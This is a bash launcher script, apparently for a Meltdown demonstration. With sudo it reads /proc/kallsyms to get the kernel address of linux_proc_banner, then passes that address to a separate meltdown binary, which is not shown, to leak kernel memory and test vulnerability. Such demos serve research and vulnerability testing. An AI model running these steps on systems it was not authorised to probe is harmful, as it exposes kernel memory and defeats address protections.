#!/bin/bash

help () {
    echo
    echo "Usage:"
    echo "For printing linux_proc_banner address in user mode:"
    echo "        ./run.sh"
    echo "For printing linux_proc_banner address in privileged mode:"
    echo "        ./run.sh -w sudo"
    echo "For printing linux_proc_banner address in privileged mode and running meltdown attack:"
    echo "        ./run.sh -w sudo -m"
    echo
}

debug=0

size=100

search_word=linux_proc_banner

if [[ "$1" == "-w" ]] && [[ "$2" == "sudo" ]];
then 
    echo "INFO: Using sudo access"
    echo
    sudo cat /proc/kallsyms | grep $search_word
elif [[ -z "$1" ]]
then
    echo "INFO: Running command to fetch the address of Linux Proc Banner without sudo access"
    echo
    cat /proc/kallsyms | grep $search_word
elif [[ "$1" == "-h" ]]
then
    help
    exit
else 
    echo "ERROR: Usage error"
    help
    exit
fi

if [[ -n "$3" ]]
then 
    if [[ "$3" == "-m" ]]
    then
        echo
        echo "INFO: Running meltdown attack on the physical address to obtained by searching the /proc/kallsyms file"
        echo
        address=$(sudo cat /proc/kallsyms | grep $search_word | sed 's/ *\([^ ]*\).*/\1/')
        echo "INFO: Linux Proc Header address fetched: $address"
        ./meltdown $address $size $debug
        vuln=$?

        if test $vuln -eq 1; then
            exit 1
        fi
        if test $vuln -eq 0; then
            exit 0
        fi
echo "Unknown return $vuln"
    else
        echo "ERROR: Usage error"
        help
        exit
    fi
fi
